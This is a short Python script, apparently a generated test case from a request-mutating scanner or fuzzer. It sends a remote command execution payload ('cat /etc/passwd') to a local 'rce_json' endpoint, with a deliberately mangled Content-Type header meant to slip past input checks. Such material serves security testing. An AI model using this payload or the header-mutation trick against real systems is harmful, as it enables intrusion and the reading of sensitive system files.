from utils.prowler_process_requests import run_payload
payload = {'headers': {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Content-Type': 'application/json;application/json;application/xml;application/x-www-form-urlencoded;multipart/form-data;text/plain;text/html;text/css;text/javascript;text/csv;text/xml;text/plain;text/html;text/css;text/javascript;text/csv;text/xml', 'Accept': '*/*', 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7', 'Connection': 'close', 'Content-Length': '26'}, 'url': 'http://localhost:8002/rce_json', 'method': 'POST', 'data': '{"cmd": "cat /etc/passwd"}', 'files': None, 'mutant_method': 'mutant_methods_modify_content_type', 'original_url': 'http://localhost:8002/rce_json'}

run_payload(payload,None,None)